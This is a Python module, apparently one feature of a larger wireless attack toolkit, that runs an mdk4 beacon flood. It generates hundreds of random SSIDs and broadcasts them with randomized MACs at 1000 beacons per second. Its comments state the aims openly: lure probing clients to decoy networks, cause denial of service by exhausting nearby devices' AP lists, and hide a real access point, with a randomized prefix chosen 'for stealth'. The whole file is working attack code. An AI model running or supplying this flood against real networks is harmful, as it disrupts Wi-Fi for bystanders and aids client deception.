import subprocess
import threading
import time
import random
import string

# Feature 5: Ghost AP (Beacon Flood)
# Creates hundreds of phantom access points on the channel to:
# 1. Confuse probe-scanning clients into connecting to decoys.
# 2. Saturate the beacon table on nearby devices (denial-of-service via AP list exhaustion).
# 3. Mask the real AP's SSID in a flood of spoofed beacons.
# Uses mdk4 (mdk3 successor) or hostapd-based looping.

class GhostAP:
    def __init__(self, interface, channel=6, ap_count=200, prefix=None):
        self.interface = interface
        self.channel = channel
        self.ap_count = ap_count
        # Default prefix is randomized for stealth
        self.prefix = prefix or "".join(random.choices(string.ascii_letters, k=4))
        self._process = None
        self._ssid_file = f"/tmp/ghost_ssids_{int(time.time())}.txt"

    def log(self, msg):
        print(f"[GhostAP] {msg}")

    def _generate_ssid_file(self):
        """Generates a list of random or prefixed SSIDs for the beacon flood."""
        self.log(f"Generating {self.ap_count} Ghost SSIDs with prefix '{self.prefix}'...")
        with open(self._ssid_file, "w") as f:
            for i in range(self.ap_count):
                # Creates SSIDs like 'corp_net_01', 'corp_net_02', etc.
                suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
                f.write(f"{self.prefix}_{suffix}\n")
        self.log(f"SSID file created: {self._ssid_file}")

    def start(self):
        """
        Starts the Ghost AP beacon flood using mdk4.
        Falls back to a message if mdk4 is not installed.
        mdk4 command: mdk4 <interface> b -f <ssidfile> -a -s 1000 -c <channel>
          b = Beacon Flood mode
          -a = randomize AP MAC addresses
          -s = speed (beacons per second)
          -c = target channel
        """
        self._generate_ssid_file()
        cmd = [
            "mdk4", self.interface, "b",
            "-f", self._ssid_file,
            "-a",
            "-s", "1000",
            "-c", str(self.channel)
        ]
        self.log(f"Starting Ghost AP flood on channel {self.channel}...")
        try:
            self._process = subprocess.Popen(
                cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            self.log(f"Ghost AP active. Broadcasting {self.ap_count} phantom networks.")
        except FileNotFoundError:
            self.log("ERROR: 'mdk4' not found. Install it with: sudo apt install mdk4")

    def stop(self):
        if self._process:
            self._process.terminate()
            self.log("Ghost AP flood stopped.")
        # Cleanup temp SSID file
        try:
            import os; os.remove(self._ssid_file)
        except OSError:
            pass

    def random_mac(self):
        """Generates a random locally-administered MAC address."""
        mac = [
            random.randint(0x00, 0xFF) for _ in range(6)
        ]
        mac[0] = (mac[0] & 0xFC) | 0x02  # Set locally administered bit
        return ":".join(f"{b:02x}" for b in mac)
